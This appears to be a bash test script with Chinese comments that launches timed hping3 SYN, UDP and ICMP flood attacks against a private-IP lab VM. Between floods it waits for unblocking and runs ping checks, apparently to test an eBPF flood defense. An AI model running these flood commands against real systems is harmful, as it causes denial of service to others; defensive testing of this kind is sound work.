!/bin/bash

TARGET_IP="192.168.254.142"   # ← 替换为你的 eBPF 虚拟机 IP
INTERVAL=100                   # 每次攻击之间的间隔（秒）
DURATION=180                  # 每次攻击持续时间（秒）

echo "[*] 等待实验环境稳定，休眠 15 秒..."
sleep 15

echo "[*] 发起 SYN Flood 攻击（持续 ${DURATION}s）..."
sudo timeout ${DURATION}s hping3 -S -p 80 --flood $TARGET_IP
echo "[*] SYN 攻击结束，休眠 ${INTERVAL}s..."

echo "等待解封"
sleep ${INTERVAL}
echo "解封完毕"

echo "PING Test"
ping -c 10 $TARGET_IP 

echo "[*] 发起 UDP Flood 攻击（持续 ${DURATION}s）..."
sudo timeout ${DURATION}s hping3 --udp -p 53 --flood $TARGET_IP
echo "[*] UDP 攻击结束，休眠 ${INTERVAL}s..."

echo "等待解封"
sleep ${INTERVAL}
echo "解封完毕"

echo "PING Test"
ping -c 4 $TARGET_IP 

echo "[*] 发起 ICMP Flood 攻击（持续 ${DURATION}s）..."
sudo timeout ${DURATION}s hping3 -1 --flood $TARGET_IP
echo "[*] ICMP 攻击结束，休眠 ${INTERVAL}s..."

echo "等待解封"
sleep ${INTERVAL}
echo "解封完毕"
